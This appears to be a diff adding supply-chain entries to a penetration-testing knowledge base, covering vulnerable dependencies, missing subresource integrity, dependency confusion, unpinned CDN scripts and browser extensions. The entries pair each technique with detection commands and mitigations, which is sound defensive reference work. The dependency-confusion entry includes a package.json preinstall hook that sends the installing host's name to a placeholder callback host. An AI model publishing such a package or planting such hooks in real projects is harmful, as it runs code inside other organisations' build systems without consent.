@@ -14642,6 +14642,1073 @@
      "name": "Validation and Business Logic"
     }
    ]
+  },
+  {
+   "id": "WEB-156",
+   "domain": "WEB",
+   "title": "Vulnerable JavaScript Dependency with a Known CVE",
+   "sequence": 613,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-1104",
+   "prerequisites": "A browser with developer tools, an intercepting proxy (Burp Suite), and the ability to enumerate the front-end's shipped JavaScript. If a source tree or build manifest is in scope, a checkout of the repository plus Node.js with npm is needed to run `npm audit`, `npm ls`, and Retire.js. A software composition analysis (SCA) tool such as OWASP Dependency-Check or `retire` (Retire.js) installed locally. Authorization to fingerprint client-side libraries and to confirm exploitability against a specific, identified component version.",
+   "whatItIs": "Modern web apps are assembled from hundreds of open-source JavaScript packages, and any one of them can carry a publicly known, catalogued vulnerability (a CVE). Because the front-end ships these libraries to every visitor's browser, their exact versions are usually readable straight from the page. When an app is running an old, unpatched version of a library that has a known flaw, an attacker does not need to discover anything new — they look up the CVE, find the public exploit, and reuse it against you.",
+   "rootCause": "Dependencies are pinned at build time and then rarely upgraded, so a component that was current on the day it was added silently ages into a known-vulnerable version as CVEs are published against it. There is often no automated alerting that ties an installed version to newly disclosed advisories, and transitive dependencies (packages pulled in by other packages) are invisible to developers who never chose them directly.",
+   "impact": "The concrete impact depends entirely on the specific library and CVE, and ranges from client-side cross-site scripting in a templating or sanitiser library, to prototype pollution in a utility library, to denial of service via a regular-expression flaw, to remote code execution when a vulnerable parser runs server-side. Because the vulnerable version is publicly visible and the exploit is already written, the barrier to exploitation is low and reliable. A single outdated dependency can hand an attacker the same capability they would otherwise have to find a novel bug for.",
+   "realWorldContext": "This is one of the most common and highest-yield findings in real engagements because it needs no creativity — the work is already published. The 2021 Log4Shell disaster (CVE-2021-44228) is the canonical example of scale: a single logging component so widely embedded, often as a transitive dependency nobody had chosen deliberately, that organisations spent months just discovering where they were running it. On the front-end specifically, older jQuery and outdated sanitiser libraries repeatedly reintroduce cross-site scripting into otherwise well-built apps. The lesson testers carry into every engagement is that the shipped version string in the page is often the fastest route to a serious, exploitable finding.",
+   "difficulty": "Beginner",
+   "timeEstimate": "30-60 min",
+   "stepsToIdentify": [
+    "Enumerate every JavaScript file the application loads (first-party bundles, vendored libraries, and third-party CDN scripts) by walking the page and its network requests through the proxy.",
+    "Fingerprint each library and its exact version from filename version strings, inline version comments, source-map metadata, or known version markers in the minified code.",
+    "Run Retire.js against the live site (`retire --js`) or against a local copy of the assets to automatically map identified versions to published advisories.",
+    "If a build manifest (package-lock.json, yarn.lock) is in scope, run `npm audit` and `npm ls <package>` to enumerate direct and transitive dependencies and their advisory status.",
+    "For each flagged component, look up the specific CVE and read its description carefully to confirm the vulnerable version range and whether the flaw is reachable in the way this app uses the library.",
+    "Verify reachability rather than assuming it: confirm the app actually calls the vulnerable code path (for example, that a flawed sanitiser is used on attacker-influenced input) before rating the finding as exploitable rather than merely present."
+   ],
+   "exploitationSteps": [
+    "Confirm the component and the exact vulnerable path are in the authorised scope, and that safe proof-of-concept exploitation is permitted, before running any exploit.",
+    "Identify the precise sink where user-controlled input reaches the vulnerable library function, using the proxy to trace input from a request parameter to the client-side code path.",
+    "Adapt the public proof-of-concept for the specific CVE to the target's usage, using benign markers rather than destructive payloads (for example, a DOM change or an out-of-band callback rather than data theft).",
+    "Trigger the flaw with the minimal input needed to demonstrate the effect, and capture the response, DOM state, or collaborator interaction as evidence.",
+    "Record the exact library, version, CVE identifier, the reachable code path, and the observed effect, so the finding is tied to a concrete upgrade target rather than a generic 'update your dependencies'.",
+    "Where the vulnerable component runs server-side (for example a Node.js parser), keep proof-of-concept strictly non-destructive and stop at the first evidence of execution, since server-side exploitation can corrupt state."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Scan the live front-end for known-vulnerable libraries",
+     "command": "retire --js --outputformat json --outputpath retire-report.json --path ./downloaded-assets/ ; retire --jspath https://<target>/"
+    },
+    {
+     "label": "Audit a build manifest for direct and transitive advisories",
+     "command": "npm audit --json > npm-audit.json ; npm audit --audit-level=high"
+    },
+    {
+     "label": "Show the dependency path that pulls in a vulnerable package",
+     "command": "npm ls <vulnerable-package>"
+    },
+    {
+     "label": "Fingerprint a library version from the shipped bundle",
+     "command": "curl -s https://<target>/static/js/vendor.js | grep -Eo '(jquery|lodash|angular|handlebars)[.-]v?[0-9]+\\.[0-9]+\\.[0-9]+' | sort -u"
+    },
+    {
+     "label": "Confirm exploitability via an out-of-band callback (benign PoC marker)",
+     "command": "# once the vulnerable sink is identified, submit input that triggers the CVE's code path and points any callback at an interactsh/Collaborator host"
+    }
+   ],
+   "variants": [
+    "Client-side XSS reintroduced by an outdated DOM-manipulation or sanitiser library, where attacker input reaches a known-flawed function.",
+    "Prototype pollution or ReDoS in an outdated utility library pulled in transitively, exploitable even though no developer chose the package directly.",
+    "A server-side Node.js dependency (parser, template engine, or deserialiser) with a known RCE CVE, reachable through an API that feeds it untrusted input.",
+    "A vulnerable version shipped only in a specific build artifact or lazy-loaded chunk, missed by a scan that only looked at the main bundle."
+   ],
+   "mitigation": [
+    "Adopt automated software composition analysis in CI (for example Dependency-Check, `npm audit`, or a managed SCA service) that fails the build when a dependency has a known high-severity advisory.",
+    "Enable automated dependency-update tooling (such as Dependabot or Renovate) so patched versions are proposed and merged continuously rather than in rare, large upgrades.",
+    "Maintain a software bill of materials (SBOM) for the application so newly disclosed CVEs can be matched against installed components immediately.",
+    "Pin and lock dependency versions, and review lockfile changes in code review so unexpected or transitive additions are visible.",
+    "Remove unused dependencies and prefer well-maintained libraries, reducing the number of components that can age into a vulnerable state.",
+    "Where an upstream fix is not yet available, apply a documented compensating control (input validation at the sink, a WAF rule, or disabling the vulnerable feature) and track it to closure."
+   ],
+   "mitigationClientFacing": "Your application is built partly from open-source software components, and at least one of them is running an old version with a publicly known, catalogued weakness. Because the exact version is visible to anyone who views the page, and a working attack for that weakness is already published, an attacker does not need to find anything new — they can simply reuse what is public. The fix is to update the affected component to a version where the flaw is corrected, and to put automated checking in place so that when a new weakness is announced against something you use, you learn about it and update quickly rather than months later. This is one of the most cost-effective security improvements available, because it closes a well-understood, easily exploited gap.",
+   "reference": {
+    "standard": "A03:2025 - Software Supply Chain Failures",
+    "cwe": "CWE-1104",
+    "tools": [
+     "Retire.js",
+     "OWASP Dependency-Check",
+     "npm audit",
+     "Burp Suite Professional"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A03 Software Supply Chain Failures",
+     "CWE-1104 (Use of Unmaintained Third Party Components)",
+     "MITRE ATT&CK T1195.001 (Compromise Software Dependencies and Development Tools)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195.001",
+     "name": "Compromise Software Dependencies and Development Tools",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CONF",
+     "name": "Configuration and Deployment Management"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V15",
+     "name": "Secure Coding and Architecture"
+    }
+   ]
+  },
+  {
+   "id": "WEB-157",
+   "domain": "WEB",
+   "title": "Missing Subresource Integrity on Externally Hosted Scripts",
+   "sequence": 614,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-353",
+   "prerequisites": "A browser and an intercepting proxy to observe which scripts and stylesheets are loaded from third-party origins. The ability to read the served HTML and inspect `<script>` and `<link>` tags for the `integrity` and `crossorigin` attributes. Authorization to enumerate third-party asset origins and to assess (not compromise) the trust relationship with each external host.",
+   "whatItIs": "Many sites pull JavaScript and CSS from external hosts such as public CDNs. When a page includes one of these files, the browser will run whatever the external host sends — it has no way to know if that file was tampered with. Subresource Integrity (SRI) is a one-line defence: you attach a cryptographic hash to the tag, and the browser refuses to run the file unless it matches. When SRI is missing on externally hosted scripts, you are trusting that third party — and everyone who can influence what it serves — to never send malicious code to your users.",
+   "rootCause": "External scripts are added for convenience and the `integrity` attribute is optional, so it is routinely omitted, especially when the CDN URL is copied from documentation that does not include a hash. The site's own security posture then silently depends on the integrity of a host it does not control, and any compromise, misconfiguration, or hostile takeover of that host executes directly in the context of the site's users.",
+   "impact": "If the external host is compromised, hijacked, or serves malicious content to some visitors, the injected code runs with full access to the including page: it can read and exfiltrate form input (including payment and login details), steal session tokens, rewrite the DOM, and perform actions as the user. Because the code executes in the first-party origin, none of the browser's cross-origin protections apply. The blast radius is every user who loads the page, and the site owner may have no visibility into the compromise because their own servers were never touched.",
+   "realWorldContext": "This is the exact mechanism behind Magecart-style skimming campaigns, where attackers who gained control of a third-party script served on checkout pages harvested payment-card data from thousands of sites at once — the 2018 British Airways breach, which drew a major regulatory penalty, followed this pattern. The 2021 compromise of the widely-embedded Polyfill.io service, and its later hostile acquisition, is a textbook demonstration: sites that had included the polyfill without integrity checking suddenly began serving whatever the new operator chose. SRI would have caused browsers to refuse the altered file outright. Testers flag missing SRI precisely because the failure mode is silent and the victim organisation is often the last to know.",
+   "difficulty": "Beginner",
+   "timeEstimate": "15-30 min",
+   "stepsToIdentify": [
+    "Load the target pages through the proxy and enumerate every `<script src=...>` and `<link rel=stylesheet href=...>` that points to a host other than the application's own origin.",
+    "For each third-party resource, inspect the served HTML tag for an `integrity` attribute and a matching `crossorigin` attribute.",
+    "Flag any externally hosted, executable resource (JavaScript in particular) that has no `integrity` attribute, since these run with no tamper protection.",
+    "Record the external origins in use and note whether they are reputable, actively maintained CDNs or lesser-known or abandoned hosts, since an abandoned or acquirable domain is a higher risk.",
+    "Check whether a Content-Security-Policy `require-sri-for` or a strict `script-src` is present that would otherwise constrain script loading, and note its absence.",
+    "Distinguish first-party bundles (which SRI does not typically apply to) from genuinely third-party resources, so the finding focuses on the trust boundary that actually exists."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to demonstrate the trust weakness, and agree that any proof-of-concept will simulate a tampered external file locally rather than by attacking the real third-party host.",
+    "Identify a page that includes an external script with no integrity attribute and map what that script can access (forms, tokens, DOM) once it executes.",
+    "Using the proxy in a controlled test session, intercept the response for the external script and substitute a benign marker payload (for example, a script that writes a visible banner or fires an out-of-band callback) to demonstrate that the browser executes whatever the external host returns.",
+    "Show that with a correct `integrity` hash present, the same substituted response is rejected by the browser and does not execute, establishing the control's effectiveness.",
+    "Assess the realistic supply-chain path: whether the external domain is expired, up for acquisition, uses weak account security, or has a history of incidents, and document that as the exploitation precondition.",
+    "Report the specific tags missing SRI, the capabilities exposed if the host is compromised, and the exact hashes that should be added, keeping all proof-of-concept within the test session."
+   ],
+   "examplePayloads": [
+    {
+     "label": "List all cross-origin scripts and whether they carry an integrity attribute",
+     "command": "curl -s https://<target>/ | grep -Eio '<script[^>]*src=\"https?://[^\"]+\"[^>]*>' | grep -iv 'integrity' "
+    },
+    {
+     "label": "Generate the correct SRI hash for an external file",
+     "command": "curl -s https://cdn.example.test/lib/app.min.js | openssl dgst -sha384 -binary | openssl base64 -A"
+    },
+    {
+     "label": "The secure form of the tag the site should be serving",
+     "command": "<script src=\"https://cdn.example.test/lib/app.min.js\" integrity=\"sha384-<base64-hash>\" crossorigin=\"anonymous\"></script>"
+    },
+    {
+     "label": "Locally simulate a tampered CDN response (benign marker) via proxy match/replace",
+     "command": "# Burp Proxy match-and-replace on the external script body -> prepend: document.title='SRI-POC'; and confirm it executes without SRI, and is blocked with SRI"
+    },
+    {
+     "label": "Enforce SRI globally via CSP as a defence-in-depth check",
+     "command": "# response header to test for: Content-Security-Policy: require-sri-for script style"
+    }
+   ],
+   "variants": [
+    "Externally hosted CSS without SRI, which can be abused for data exfiltration and UI redressing even without script execution.",
+    "A dynamically injected external script (added by first-party code at runtime) that cannot carry a static integrity attribute and is loaded without any integrity check.",
+    "An SRI hash present but pinned to a `latest` or auto-updating URL, so the hash and the served file drift and the browser silently falls back to running an unverified file.",
+    "Loading from an abandoned or acquirable third-party domain, where the supply-chain compromise requires only registering or buying the host rather than breaking into it."
+   ],
+   "mitigation": [
+    "Add an `integrity` attribute containing a strong (SHA-384 or SHA-512) hash and a `crossorigin` attribute to every externally hosted script and stylesheet.",
+    "Pin external resources to specific, versioned, immutable URLs rather than mutable 'latest' paths, so the served content and the hash cannot drift apart.",
+    "Prefer self-hosting critical third-party libraries from your own origin, which removes the external trust dependency entirely and lets you control updates.",
+    "Deploy a Content Security Policy that restricts `script-src` to known origins and, where supported, requires integrity metadata for scripts and styles.",
+    "Periodically re-verify that external origins are still owned by the expected, reputable operator, and remove references to abandoned or transferred domains.",
+    "Establish a review step so any newly added third-party resource is added with an integrity hash by default, making the secure form the path of least resistance."
+   ],
+   "mitigationClientFacing": "Some of your pages load JavaScript and styling directly from other companies' servers, and they do so without a tamper check. That means if one of those outside servers is ever compromised or changes hands, your users' browsers will run whatever it sends — including code designed to steal login details or payment information typed into your pages — and this would happen even though your own systems were never touched. The fix is small and well-established: attach a cryptographic fingerprint to each externally loaded file so browsers refuse to run it if it has been altered, and, for the most important files, host them yourself so the trust stays inside your control. This closes a quiet but serious route to attacking your customers through a third party.",
+   "reference": {
+    "standard": "A03:2025 - Software Supply Chain Failures",
+    "cwe": "CWE-353",
+    "tools": [
+     "Burp Suite Professional",
+     "curl",
+     "openssl",
+     "SRI Hash Generator (srihash.org)"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A03 Software Supply Chain Failures",
+     "CWE-353 (Missing Support for Integrity Check)",
+     "MDN Subresource Integrity",
+     "MITRE ATT&CK T1195.002 (Compromise Software Supply Chain)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V11",
+     "name": "Cryptography"
+    }
+   ]
+  },
+  {
+   "id": "WEB-158",
+   "domain": "WEB",
+   "title": "Dependency Confusion via Public Registry Namespace Hijack",
+   "sequence": 615,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-1357",
+   "prerequisites": "Visibility into the application's client-side or build-time dependencies — leaked internal package names in shipped JavaScript, source maps, error messages, or (if in scope) the repository's manifest files. An account on the relevant public package registry (npm, PyPI, RubyGems) for controlled proof-of-concept publication. Explicit written authorization is essential: publishing a package that internal builds might install is an active technique that must be tightly scoped, use a benign callback-only payload, and be coordinated with the client so nothing production-facing is affected.",
+   "whatItIs": "Large organisations build software using a mix of public open-source packages and private, internal-only packages. Many package managers, when told to install a package, check both the internal registry and the public one — and often prefer whichever has the higher version number. Dependency confusion abuses this: an attacker learns the name of one of your internal packages, publishes a package with the same name but a very high version number to the public registry, and waits for your build systems to pull the attacker's package instead of yours.",
+   "rootCause": "The default resolution behaviour of common package managers merges public and private sources into one namespace and resolves by version rather than by trusted source. Internal package names are treated as secret when they are frequently exposed in front-end bundles, source maps, and logs. Because the public registry has no ownership link to the organisation's internal name, anyone can claim an unregistered internal name publicly, and a build that is not explicitly scoped to the private source will happily prefer the public impostor.",
+   "impact": "A successful confusion attack executes attacker-controlled code inside the organisation's build or developer environment via install-time hooks, which is one of the most privileged positions available: build systems typically hold source code, signing keys, cloud credentials, and deployment access. From there an attacker can exfiltrate secrets, tamper with build outputs to reach every downstream user, or pivot into internal networks. The compromise happens upstream of the released product, so it can silently poison every artifact the pipeline produces.",
+   "realWorldContext": "This class of attack was demonstrated at scale in 2021 by security researcher Alex Birsan, who published benign packages matching the internal names of dozens of major technology companies and received install-time callbacks from inside their build systems, earning substantial bug-bounty rewards and prompting industry-wide guidance changes. The technique is compelling precisely because it needs no break-in: the victim's own automation reaches out and installs the attacker's code. It reshaped how registries and package managers handle scoping, and it remains a live risk wherever internal names are guessable and resolution is not locked to a trusted source. Testers treat any leaked internal package name as a potential foothold into the build pipeline.",
+   "difficulty": "Advanced",
+   "timeEstimate": "2-4 hours",
+   "stepsToIdentify": [
+    "Harvest candidate internal package names from shipped JavaScript bundles, source maps, webpack chunk metadata, verbose error pages, and (if in scope) manifest files such as package.json, requirements.txt, or Gemfile.",
+    "For each candidate, query the public registry to determine whether the name is already claimed, since an unclaimed internal name is the precondition for the attack.",
+    "Check the organisation's package manager configuration (if in scope) for scoping controls: an .npmrc with a scoped registry, a lockfile pinning resolved sources, or a private-only registry configuration.",
+    "Identify whether internal packages use a registry scope prefix (for example @company/pkg), since scoped packages with a reserved scope are much harder to confuse.",
+    "Determine which build or CI environments run installs and whether they resolve against a merged public/private source or a strictly private one.",
+    "Prioritise names that are both unclaimed on the public registry and clearly internal in nature, and document them as the confusable surface without publishing anything yet."
+   ],
+   "exploitationSteps": [
+    "Obtain explicit, written authorization for controlled publication, agree on a single target internal name, a benign callback-only payload, and a takedown plan, and coordinate timing with the client so no production build is disrupted.",
+    "Prepare a proof-of-concept package under the identified name with a version far higher than any legitimate internal release, and an install hook that only performs an out-of-band callback carrying non-sensitive host metadata.",
+    "Publish the package to the public registry within the agreed window, then monitor the out-of-band listener for callbacks indicating that an internal build resolved the public package.",
+    "Record the callback details (which environment resolved it, and when) as evidence of resolution, and do not attempt to collect secrets or persist access.",
+    "Immediately unpublish or deprecate the proof-of-concept package after evidence is captured, and confirm with the client that no build state was affected.",
+    "Report the confirmed confusable name, the resolution path that pulled the public package, and the specific scoping and lockfile controls that would have prevented it."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Check whether a suspected internal name is unclaimed on npm",
+     "command": "npm view <internal-package-name> 2>&1 | head -n 5"
+    },
+    {
+     "label": "Extract candidate internal package names from a shipped source map",
+     "command": "curl -s https://<target>/static/js/main.js.map | grep -Eo '\"@[a-z0-9-]+/[a-z0-9-]+\"|require\\((\\x27|\")[a-z0-9@/._-]+' | sort -u"
+    },
+    {
+     "label": "Benign install-hook (callback only) for an authorized PoC package.json",
+     "command": "{ \"name\": \"<internal-package-name>\", \"version\": \"99.99.99\", \"scripts\": { \"preinstall\": \"node -e \\\"require('https').get('https://<collaborator-host>/'+require('os').hostname())\\\"\" } }"
+    },
+    {
+     "label": "Publish the authorized PoC package within the agreed window",
+     "command": "npm publish --access public"
+    },
+    {
+     "label": "Remove the PoC package immediately after capturing evidence",
+     "command": "npm unpublish <internal-package-name>@99.99.99 --force"
+    }
+   ],
+   "variants": [
+    "PyPI or RubyGems confusion using the same merged-namespace, highest-version resolution behaviour in pip or Bundler.",
+    "Typosquatting a legitimate public package name (for example a one-character difference) so a mistyped install pulls the attacker's package.",
+    "Internal-scope hijack where an organisation's @scope prefix is unregistered on the public registry, letting an attacker claim the whole scope.",
+    "Build-cache or mirror poisoning where an internal proxy falls through to the public registry for a name it does not recognise."
+   ],
+   "mitigation": [
+    "Reserve your organisation's package scopes and internal names on all relevant public registries so an attacker cannot claim them, even if you never publish to them.",
+    "Configure package managers to resolve internal names exclusively from the private registry (for example scoped-registry entries in .npmrc), never falling through to the public source for those names.",
+    "Commit and enforce lockfiles that pin both the version and the resolved source URL, and verify integrity hashes on install.",
+    "Use a controlled internal proxy/mirror that does not automatically fetch and cache unknown names from the public registry.",
+    "Adopt registry scopes for all internal packages and treat the scope as a reserved namespace, which structurally prevents same-name public impostors.",
+    "Monitor public registries for newly published packages matching your internal names and alert on any match as a potential attack in progress."
+   ],
+   "mitigationClientFacing": "Your software is built from a mix of your own private packages and public open-source ones, and your build tools can be tricked into downloading a public package that has been given the same name as one of your private ones — with a higher version number so it wins. If an attacker learns an internal package name (these names leak more often than people expect) and publishes an impostor, your own automated build systems could fetch and run the attacker's code, which is an extremely powerful position because build systems hold your source code and deployment credentials. The fix is to make sure your build tools only ever get internal packages from your internal source, to reserve your names on the public registries so nobody else can claim them, and to lock exactly which package and source each build uses. These are configuration changes that close the door on your automation reaching out and trusting a stranger.",
+   "reference": {
+    "standard": "A03:2025 - Software Supply Chain Failures",
+    "cwe": "CWE-1357",
+    "tools": [
+     "npm",
+     "pip",
+     "Burp Suite Professional",
+     "interactsh-client"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A03 Software Supply Chain Failures",
+     "CWE-1357 (Reliance on Insufficiently Trustworthy Component)",
+     "MITRE ATT&CK T1195.001 (Compromise Software Dependencies and Development Tools)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195.001",
+     "name": "Compromise Software Dependencies and Development Tools",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CONF",
+     "name": "Configuration and Deployment Management"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V15",
+     "name": "Secure Coding and Architecture"
+    }
+   ]
+  },
+  {
+   "id": "WEB-159",
+   "domain": "WEB",
+   "title": "Unpinned Third-Party CDN Script Serving Mutable Content",
+   "sequence": 616,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-829",
+   "prerequisites": "A browser, an intercepting proxy, and the ability to read the served HTML for third-party `<script>` sources. Knowledge of how to distinguish a version-pinned, immutable CDN URL from a mutable one (for example a path ending in `/latest/` or a floating major version). Authorization to enumerate and assess third-party script inclusions and their versioning, without attacking the CDN itself.",
+   "whatItIs": "When a site loads a script from a public CDN, the URL can either point at one exact, frozen version of the file or at a moving target like 'the latest release'. A moving URL means the file your users receive today can silently become a different file tomorrow, chosen by the library's maintainer, not by you. That is convenient until a maintainer account is compromised, a project is handed to a new owner, or a bad release ships — at which point the new content executes on your site with no change on your side and no warning.",
+   "rootCause": "Convenience URLs that always serve the newest build are widely published in documentation and copied verbatim, trading control for ease of updates. The site delegates the decision of exactly what code runs to whoever controls the upstream project and its distribution, and without an integrity pin there is no mechanism to detect or block a change. The trust is implicit and continuous rather than reviewed per version.",
+   "impact": "Any change to the upstream file — whether malicious, accidental, or the result of an ownership transfer — runs immediately in the first-party context of every page that includes it, with full access to the DOM, forms, cookies accessible to script, and user actions. Because the site's own code and servers do not change, the compromise is invisible to the site owner's normal monitoring, and the window between upstream change and detection can be long. The impact is effectively the same as a script injection that the site owner cannot see coming.",
+   "realWorldContext": "The 2024 Polyfill.io incident is the defining example: a hugely popular polyfill service, loaded from a floating URL on hundreds of thousands of sites, changed hands and the new operator began serving malicious code that redirected users — sites that had pinned nothing and verified nothing simply started running it. Earlier, the 2018 event-stream npm episode showed the same trust dynamic in a package a new maintainer was handed and then abused. In engagements, unpinned CDN references are flagged because the failure requires no attack on the customer at all; it rides in through a URL the customer deliberately configured to auto-update. The remediation — pin the version and add an integrity hash — is cheap relative to the exposure.",
+   "difficulty": "Beginner",
+   "timeEstimate": "15-30 min",
+   "stepsToIdentify": [
+    "Enumerate all third-party script and stylesheet inclusions across the in-scope pages through the proxy.",
+    "For each external URL, classify it as immutable (a specific pinned version, for example `/library@1.2.3/`) or mutable (a floating path such as `/latest/`, `/library@1/`, or an unversioned filename).",
+    "For every mutable reference, check whether an `integrity` attribute is present that would still block an unexpected change.",
+    "Flag references that are both mutable and lack integrity, since these will execute whatever upstream serves next with no verification.",
+    "Assess the reputation and ownership stability of each upstream host, noting any that are known to have changed hands, be for sale, or be lightly maintained.",
+    "Record whether a Content Security Policy is present that would constrain what these scripts can do if they turned hostile."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to demonstrate the risk, and agree that the proof-of-concept will simulate an upstream change locally in the test session rather than attacking the real CDN or its maintainers.",
+    "Select a mutable, un-pinned, un-hashed external reference and enumerate what a hostile version of that script could access on the including pages.",
+    "Within a controlled test session, use the proxy to replace the fetched script body with a benign marker (for example code that sets a visible flag or fires an out-of-band callback), demonstrating that the browser runs whatever the mutable URL returns.",
+    "Show that pinning the URL to a specific version and adding a correct integrity hash causes the same substituted content to be rejected, confirming the fix.",
+    "Document the realistic trigger conditions (maintainer compromise, ownership transfer, or a bad upstream release) that would cause the mutable URL to serve different content in production.",
+    "Report each mutable reference, the capabilities it would expose if changed, and the exact pinned URL and integrity hash that should replace it."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Find mutable, floating-version CDN references in the page",
+     "command": "curl -s https://<target>/ | grep -Eio 'src=\"https?://[^\"]+\"' | grep -Ei '/latest/|@latest|/[a-z0-9-]+\\.js\"|@[0-9]+\"' "
+    },
+    {
+     "label": "Resolve what a floating URL currently serves and hash it",
+     "command": "curl -s https://cdn.example.test/lib/latest/app.js | openssl dgst -sha384 -binary | openssl base64 -A"
+    },
+    {
+     "label": "Secure, pinned replacement with integrity",
+     "command": "<script src=\"https://cdn.example.test/lib@1.2.3/app.min.js\" integrity=\"sha384-<base64-hash>\" crossorigin=\"anonymous\"></script>"
+    },
+    {
+     "label": "Simulate an upstream content change (benign marker) in the test session",
+     "command": "# Burp match-and-replace on the external script body -> inject: window.__cdn_poc=true; confirm execution with mutable URL, blocked with integrity"
+    },
+    {
+     "label": "Detect a floating major-version pin that still drifts on minor releases",
+     "command": "curl -s https://<target>/ | grep -Eio '@[0-9]+(\\.[0-9]+)?/' | sort -u"
+    }
+   ],
+   "variants": [
+    "A floating major-version pin (for example `@2/`) that appears pinned but still auto-updates across minor and patch releases.",
+    "An unversioned filename on the CDN (for example `/dist/bundle.js`) that the upstream overwrites in place on each release.",
+    "A mutable stylesheet reference, which can be abused for exfiltration and UI redressing even without direct script execution.",
+    "A pinned URL with a stale or absent integrity hash, so the pin is present but no verification actually occurs."
+   ],
+   "mitigation": [
+    "Reference third-party assets only by exact, immutable, version-pinned URLs, never by floating 'latest' or bare major-version paths.",
+    "Attach a strong integrity hash and `crossorigin` attribute to every external reference so any content change is detected and blocked by the browser.",
+    "Prefer self-hosting critical third-party scripts from your own origin, giving you full control over exactly what version runs and when it changes.",
+    "Establish a deliberate, reviewed process for upgrading pinned versions, so updates are a conscious decision with a corresponding hash update rather than automatic.",
+    "Deploy a Content Security Policy limiting script origins and capabilities, reducing what a hostile external script could do if one ever executed.",
+    "Periodically verify the ownership and health of every upstream CDN and remove references to hosts that are abandoned, for sale, or have changed operators."
+   ],
+   "mitigationClientFacing": "A few of your pages load code from an outside provider using a link that always fetches 'the newest version' rather than one specific, fixed version. This is convenient, but it means the outside provider — or anyone who takes over that provider — can change the code your users run, at any time, with no change on your end and no alert to you. There is a well-known case where exactly this happened and a popular service began serving malicious code to every site that had linked to it loosely. The fix is to lock each outside link to one exact version and attach a fingerprint so your users' browsers refuse anything that has been altered, and to update those versions deliberately rather than automatically. It is a small change that turns a silent, open-ended trust into a controlled, verifiable one.",
+   "reference": {
+    "standard": "A03:2025 - Software Supply Chain Failures",
+    "cwe": "CWE-829",
+    "tools": [
+     "Burp Suite Professional",
+     "curl",
+     "openssl",
+     "Retire.js"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A03 Software Supply Chain Failures",
+     "CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)",
+     "MDN Subresource Integrity",
+     "MITRE ATT&CK T1195.002 (Compromise Software Supply Chain)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195",
+     "name": "Supply Chain Compromise",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V15",
+     "name": "Secure Coding and Architecture"
+    }
+   ]
+  },
+  {
+   "id": "WEB-160",
+   "domain": "WEB",
+   "title": "Malicious or Over-Permissioned Third-Party Browser Extension in the Supply Chain",
+   "sequence": 617,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-829",
+   "prerequisites": "A test browser profile in which candidate extensions can be installed in isolation, developer tools, and an intercepting proxy. If the engagement covers an organisation-published or partner extension, access to its manifest and source (from the store listing or a repository in scope). Authorization to assess how third-party extensions interact with the target application, and to review the trust and update model of any extension the organisation ships or recommends. This is an assessment of a supply-chain trust relationship, not an attack on end-user machines.",
+   "whatItIs": "Browser extensions run inside the user's browser with permissions that can include reading and modifying the content of pages, intercepting network requests, and accessing cookies. When an organisation publishes or recommends an extension — or when its web app depends on one — that extension becomes part of the software supply chain. Extensions update automatically and silently, and a compromised developer account or a sold extension can push a hostile update to every installed user at once, executing on your application's pages.",
+   "rootCause": "Extensions request broad host permissions that users grant once and rarely revisit, and the platform's automatic-update model means the code running today can be replaced by the maintainer without any user action. Ownership of a popular extension is transferable and developer accounts are phishable, so the trust placed in the original author does not necessarily persist. Applications that rely on an extension, or organisations that recommend one, inherit that ongoing, unmonitored trust.",
+   "impact": "A hostile extension update running on your application's pages can read and exfiltrate everything the user sees and types, including credentials and sensitive records, inject content and forged UI, hijack sessions, and silently perform actions as the user. Because the code runs client-side under the user's own session and updates arrive automatically, the compromise can affect a large population instantly and is very hard for the application owner to detect. When the extension is one the organisation itself ships or recommends, the reputational and trust damage compounds the direct data loss.",
+   "realWorldContext": "Compromised and sold browser extensions are a recurring supply-chain problem: attackers have repeatedly bought popular extensions or phished their developers' store accounts and pushed malicious auto-updates to millions of users, and in late 2024 a wave of phishing against extension publishers led to several legitimate extensions being trojanised through their own update channels. The dynamic mirrors other supply-chain compromises — the victim installed something trustworthy and the trust was later abused upstream. In engagements, testers examine any extension the organisation publishes, bundles, or recommends, because its permissions and update path can quietly become a channel straight into the application's authenticated pages.",
+   "difficulty": "Intermediate",
